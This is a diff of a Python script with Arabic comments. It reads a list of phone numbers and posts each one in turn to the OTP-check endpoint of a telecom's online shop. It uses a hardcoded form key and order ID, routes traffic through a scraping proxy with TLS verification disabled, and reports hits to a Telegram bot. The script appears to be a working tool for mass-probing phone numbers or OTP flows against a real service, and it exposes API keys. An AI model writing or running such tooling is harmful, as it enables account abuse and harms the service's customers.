@@ -1,12 +1,6 @@
 import requests
 import time
 import json
-from concurrent.futures import ThreadPoolExecutor, as_completed
-
-# User-Agents
-USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
-]
 
 # ScraperAPI Key
 SCRAPER_API_KEY = 'e42b050dcb697cf3ccd3d663edf43aea'
@@ -17,15 +11,14 @@ TELEGRAM_CHAT_ID = '6873334348'
 TELEGRAM_API = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
 
 # الإعدادات
-NUM_THREADS = 1
 DELAY = 2
 
 def check_phone(phone_number, index, total):
-    """فحص رقم باستخدام ScraperAPI بشكل صحيح"""
+    """فحص رقم باستخدام ScraperAPI"""
     try:
         time.sleep(DELAY)
         
-        # الـ URL الصحيحة
+        # الـ URL الصحيحة من DevTools
         url = 'https://eshop.umniah.com/ar/vendic/index/checkotp/?form_key=pjWimsiCGndV6EMK'
         
         # البيانات JSON
@@ -35,57 +28,48 @@ def check_phone(phone_number, index, total):
             'orderid': '727965'
         }
         
-        # طلب ScraperAPI
-        payload = {
-            'api_key': SCRAPER_API_KEY,
-            'url': url,
+        # استخدام ScraperAPI كـ Proxy
+        proxies = {
+            'http': f'http://scraperapi:{SCRAPER_API_KEY}@proxy-server.scraperapi.com:8001',
+            'https': f'http://scraperapi:{SCRAPER_API_KEY}@proxy-server.scraperapi.com:8001',
         }
         
+        # إرسال الطلب عبر البروكسي
         response = requests.post(
-            'https://api.scraperapi.com',
-            params=payload,
+            url,
             json=json_data,
-            headers={'User-Agent': USER_AGENTS[0]},
-            timeout=20
+            proxies=proxies,
+            timeout=20,
+            verify=False
         )
         
         print(f"[{index}/{total}] {phone_number} - Status: {response.status_code}")
-        print(f"[{index}/{total}] Response: {response.text[:300]}")
         
         if response.status_code == 200:
-            try:
-                result = response.json()
-                
-                # تحقق من الرد
-                if 'success' in str(result).lower():
-                    print(f"[{index}/{total}] ✅ {phone_number} - نجح!")
-                    send_telegram(f"✅ {phone_number} - نجح!")
-                    remove_from_file(phone_number)
-                    return ('success', phone_number)
-                else:
-                    print(f"[{index}/{total}] ❌ {phone_number} - فشل")
-                    remove_from_file(phone_number)
-                    return ('failed', phone_number)
-                    
-            except Exception as e:
-                print(f"[{index}/{total}] ⚠️ {phone_number} - خطأ JSON: {str(e)[:50]}")
-                remove_from_file(phone_number)
-                return ('json_error', phone_number)
+            print(f"[{index}/{total}] ✅ نجح! Response: {response.text[:200]}")
+            send_telegram(f"✅ {phone_number} - نجح الفحص!")
+            return True
         else:
-            print(f"[{index}/{total}] ❌ HTTP {response.status_code}")
-            return ('error', phone_number)
+            print(f"[{index}/{total}] ❌ فشل - HTTP {response.status_code}")
+            return False
     
     except Exception as e:
-        print(f"[{index}/{total}] ❌ {phone_number} - {str(e)[:50]}")
-        return ('error', phone_number)
+        print(f"[{index}/{total}] ❌ خطأ: {str(e)[:100]}")
+        return False
 
 def send_telegram(msg):
+    """إرسال رسالة عبر Telegram"""
     try:
-        requests.post(TELEGRAM_API, json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg}, timeout=5)
+        requests.post(
+            TELEGRAM_API,
+            json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg},
+            timeout=5
+        )
     except:
         pass
 
 def remove_from_file(phone):
+    """حذف الرقم من الملف"""
     try:
         with open('lu1.txt', 'r', encoding='utf-8') as f:
             lines = f.readlines()
@@ -101,36 +85,37 @@ def main():
         
         total = len(phones)
         if total == 0:
-            print("لا توجد أرقام!")
+            print("❌ ملف lu1.txt فارغ!")
             return
         
-        print(f"\n✅ عدد الأرقام: {total}")
-        print(f"🚀 بدء الفحص (ScraperAPI)...\n")
+        print(f"\n{'='*50}")
+        print(f"✅ عدد الأرقام: {total}")
+        print(f"🚀 بدء الفحص عبر ScraperAPI...")
+        print(f"{'='*50}\n")
         
         success = 0
         failed = 0
-        errors = 0
         
         for idx, phone in enumerate(phones, 1):
-            status, _ = check_phone(phone, idx, total)
-            
-            if status == 'success':
+            result = check_phone(phone, idx, total)
+            if result:
                 success += 1
-            elif status == 'failed':
-                failed += 1
             else:
-                errors += 1
+                failed += 1
+            remove_from_file(phone)
         
         print(f"\n{'='*50}")
         print(f"✅ نجح: {success}")
         print(f"❌ فشل: {failed}")
-        print(f"⚠️ أخطاء: {errors}")
         print(f"{'='*50}\n")
+        send_telegram(f"انتهى الفحص: ✅ {success} نجح ❌ {failed} فشل")
 
     except FileNotFoundError:
         print("❌ ملف lu1.txt غير موجود!")
     except KeyboardInterrupt:
-        print("\n⛔ توقف")
+        print("\n⛔ توقف البرنامج")
 
 if __name__ == "__main__":
+    # تعطيل تحذير SSL (ممكن تحتاجها مع بعض الخوادم)
+    requests.packages.urllib3.disable_warnings()
     main()
